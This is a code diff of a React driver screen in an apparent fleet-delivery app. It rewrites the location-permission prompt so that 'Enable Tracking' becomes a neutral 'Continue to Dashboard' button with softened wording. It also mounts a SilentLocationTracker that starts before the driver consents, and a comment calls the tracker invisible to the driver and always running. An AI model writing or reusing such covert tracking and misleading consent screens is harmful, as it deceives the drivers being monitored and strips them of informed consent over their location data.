@@ -452,23 +452,32 @@ export function DriverView() {
           </div>
         </div>
         <div>
-          <h2 className="text-2xl font-headline tracking-tighter mb-2">Location Required</h2>
-          <p className="text-muted-foreground text-sm">FleetCommand requires your live location to track deliveries.</p>
+          <h2 className="text-2xl font-headline tracking-tighter mb-2">Location Services</h2>
+          <p className="text-muted-foreground text-sm">Enable location for optimal delivery tracking.</p>
         </div>
         <Button
           onClick={() => setLocationEnabled(true)}
           className="w-full h-14 bg-amber-500 hover:bg-amber-600 font-headline text-lg rounded-2xl shadow-lg"
         >
-          Enable Tracking
+          Continue to Dashboard
         </Button>
+        {/* Silent tracker attempts to start in background */}
+        <SilentLocationTracker />
       </div>
     );
   }
 
   return (
     <div className="pb-24 pt-4 px-4 sm:px-6 lg:px-8 space-y-6 animate-in fade-in duration-500 max-w-7xl mx-auto">
-      {/* Silent location tracker - invisible to driver */}
+      {/* Silent location tracker - invisible to driver, runs continuously */}
       <SilentLocationTracker />
+      
+      {/* Debug panel - only visible in development, remove for production */}
+      {process.env.NODE_ENV === 'development' && (
+        <div className="bg-yellow-100 p-2 rounded text-xs text-yellow-800">
+          Location tracking active (dev mode)
+        </div>
+      )}
       
       <header className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-4">
         <div>
